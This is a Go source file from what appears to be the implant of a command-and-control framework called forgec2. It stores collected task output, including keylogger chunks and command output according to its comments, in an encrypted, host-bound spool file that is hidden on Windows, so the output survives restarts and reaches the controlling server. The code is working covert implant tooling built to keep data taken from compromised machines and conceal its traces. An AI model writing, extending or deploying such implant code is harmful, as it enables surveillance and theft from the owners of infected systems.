package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"
)

// Pending task results are the only agent state that cannot be regenerated: a
// task's output exists only in memory after the worker finishes. The spool
// below snapshots that queue to disk, encrypted with a key derived from the
// persistent identity key, so a crash or restart does not silently discard
// collected output.
//
// Delivery stays at-least-once. The in-flight results of the beacon currently
// on the wire remain part of the snapshot until the server's reply is decoded,
// and ResultIDs let the server dedupe a replay whose reply was lost. Task acks
// are deliberately NOT persisted: agent restarts already replay unacknowledged
// tasks (seenTaskIDs is memory-only), and keeping only outputs on disk keeps
// the artifact small and free of control-plane state.
const (
	resultsSpoolMagic = "FC2SP1"
	resultsSpoolInfo  = "forgec2-results-spool-v1"
	// Sanity cap for reads. The queue bound is 16 MiB of raw output, and the
	// in-flight set rides on top of it while a beacon is outstanding, so a
	// worst-case JSON snapshot (control bytes escape to six characters) is
	// under ~192 MiB; anything larger is corruption, not a queue.
	maxResultsSpoolBytes = 256 << 20
	resultsSpoolDebounce = time.Second
)

var (
	// inflightResults holds the results handed to the beacon currently being
	// sent. Guarded by pendingMu. Keeping them separate from pendingResults
	// means a concurrent enqueue flush cannot erase them from the snapshot
	// while the request is still awaiting a reply.
	inflightResults []TaskResult

	// pendingResultsSpoolPath is a variable so tests can redirect the spool to
	// a temporary directory.
	pendingResultsSpoolPath = func() string {
		return getBeaconStateFilePath("results.spool")
	}

	spoolLoopOnce sync.Once
	spoolDirty    = make(chan struct{}, 1)
	// spoolWriteMu serializes snapshot+write so two flushes cannot finish out
	// of order and let an older snapshot resurrect delivered results on disk.
	spoolWriteMu sync.Mutex
)

// resultsSpoolKey derives the AES-256 key from the persistent X25519 identity
// private key, bound to this agent's UUID. A spool copied to another host or
// agent therefore does not decrypt.
func resultsSpoolKey() []byte {
	if identityPriv == nil {
		return nil
	}
	return hkdfSHA256(identityPriv.Bytes(), []byte(resultsSpoolInfo), []byte(agentUUID))
}

func resultsSpoolAAD() []byte {
	return []byte(resultsSpoolInfo + "\x00" + agentUUID)
}

func encryptResultsSpool(key []byte, results []TaskResult) ([]byte, error) {
	plain, err := json.Marshal(results)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	out := make([]byte, 0, len(resultsSpoolMagic)+len(nonce)+len(plain)+gcm.Overhead())
	out = append(out, resultsSpoolMagic...)
	out = append(out, nonce...)
	return gcm.Seal(out, nonce, plain, resultsSpoolAAD()), nil
}

func decryptResultsSpool(key, data []byte) ([]TaskResult, error) {
	if !bytes.HasPrefix(data, []byte(resultsSpoolMagic)) {
		return nil, errors.New("results spool: bad magic")
	}
	rest := data[len(resultsSpoolMagic):]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(rest) < gcm.NonceSize()+gcm.Overhead() {
		return nil, errors.New("results spool: truncated")
	}
	nonce := rest[:gcm.NonceSize()]
	plain, err := gcm.Open(nil, nonce, rest[gcm.NonceSize():], resultsSpoolAAD())
	if err != nil {
		return nil, err
	}
	var results []TaskResult
	if err := json.Unmarshal(plain, &results); err != nil {
		return nil, err
	}
	return results, nil
}

// writeResultsSpool atomically replaces path with the encrypted snapshot. An
// empty snapshot deletes the file so delivered results are not replayed after
// a restart. Atomic rename means a crash mid-write leaves the previous
// snapshot intact.
func writeResultsSpool(path string, results []TaskResult) error {
	if len(results) == 0 {
		if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
			return err
		}
		return nil
	}
	key := resultsSpoolKey()
	if key == nil {
		return errors.New("results spool: identity key unavailable")
	}
	data, err := encryptResultsSpool(key, results)
	if err != nil {
		return err
	}
	tmp, err := os.CreateTemp(filepath.Dir(path), ".results-*.tmp")
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	fail := func(err error) error {
		_ = tmp.Close()
		_ = os.Remove(tmpName)
		return err
	}
	if runtime.GOOS != "windows" {
		if err := tmp.Chmod(0o600); err != nil {
			return fail(err)
		}
	}
	if _, err := tmp.Write(data); err != nil {
		return fail(err)
	}
	// Sync before rename: the point of the spool is surviving an abrupt
	// process death, and on some filesystems a rename without a data flush can
	// leave an empty file after power loss.
	if err := tmp.Sync(); err != nil {
		return fail(err)
	}
	if err := tmp.Close(); err != nil {
		_ = os.Remove(tmpName)
		return err
	}
	if err := os.Rename(tmpName, path); err != nil {
		_ = os.Remove(tmpName)
		return err
	}
	if runtime.GOOS == "windows" {
		setHidden(path)
	}
	return nil
}

func readResultsSpool(path string) ([]TaskResult, error) {
	fi, err := os.Stat(path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, err
	}
	if fi.Size() > maxResultsSpoolBytes {
		return nil, fmt.Errorf("results spool: %d bytes exceeds limit", fi.Size())
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	key := resultsSpoolKey()
	if key == nil {
		return nil, errors.New("results spool: identity key unavailable")
	}
	return decryptResultsSpool(key, data)
}

// loadPendingResultsSpool restores the queue at startup, before the beacon
// loop runs. An unreadable spool (rotated identity key, corruption, a file
// from a different agent) is discarded rather than retried forever.
func loadPendingResultsSpool() {
	path := pendingResultsSpoolPath()
	results, err := readResultsSpool(path)
	if err != nil {
		logDebugf("discarding unreadable results spool: %v", err)
		_ = os.Remove(path)
		return
	}
	if len(results) == 0 {
		return
	}
	// Backfill the idempotency id for any entry that predates the
	// assign-at-enqueue rule, so a replay after this restart is still
	// dedupable by the server.
	for i := range results {
		ensureResultID(&results[i])
	}
	pendingMu.Lock()
	pendingResults = append(results, pendingResults...)
	dropped := reenforcePendingBounds()
	pendingMu.Unlock()
	if dropped > 0 {
		markPendingResultsDirty()
	}
	logDebugf("restored %d pending task result(s) from spool", len(results))
}

// pendingResultsSnapshot returns the on-disk view of the queue: the results
// currently on the wire followed by everything still waiting. Caller must hold
// pendingMu.
func pendingResultsSnapshot() []TaskResult {
	snapshot := make([]TaskResult, 0, len(inflightResults)+len(pendingResults))
	snapshot = append(snapshot, inflightResults...)
	snapshot = append(snapshot, pendingResults...)
	return snapshot
}

func flushPendingResultsSpool() {
	spoolWriteMu.Lock()
	defer spoolWriteMu.Unlock()
	pendingMu.Lock()
	snapshot := pendingResultsSnapshot()
	pendingMu.Unlock()
	if err := writeResultsSpool(pendingResultsSpoolPath(), snapshot); err != nil {
		logDebugf("results spool write failed: %v", err)
	}
}

// markPendingResultsDirty schedules a debounced snapshot write. Bursts
// (keylogger chunks, streamed command output) coalesce into one write; a crash
// inside the debounce window loses at most the newest results.
func markPendingResultsDirty() {
	spoolLoopOnce.Do(func() { go pendingResultsSpoolLoop() })
	select {
	case spoolDirty <- struct{}{}:
	default:
	}
}

func pendingResultsSpoolLoop() {
	for range spoolDirty {
		time.Sleep(resultsSpoolDebounce)
		// A signal that arrived while sleeping is covered by this flush.
		select {
		case <-spoolDirty:
		default:
		}
		flushPendingResultsSpool()
	}
}

// clearInflightResults marks the in-flight results as delivered: the server's
// reply was decoded, so the snapshot may drop them.
func clearInflightResults() {
	pendingMu.Lock()
	had := len(inflightResults) > 0
	inflightResults = nil
	pendingMu.Unlock()
	if had {
		markPendingResultsDirty()
	}
}

// restoreInflightResults returns results from a panicked beacon to the front
// of the queue. The set on disk is unchanged (in-flight results were part of
// the last snapshot or of a still-pending dirty flush), so no write is needed.
func restoreInflightResults() {
	pendingMu.Lock()
	if len(inflightResults) > 0 {
		pendingResults = append(inflightResults, pendingResults...)
		inflightResults = nil
		if reenforcePendingBounds() > 0 {
			pendingMu.Unlock()
			markPendingResultsDirty()
			return
		}
	}
	pendingMu.Unlock()
}
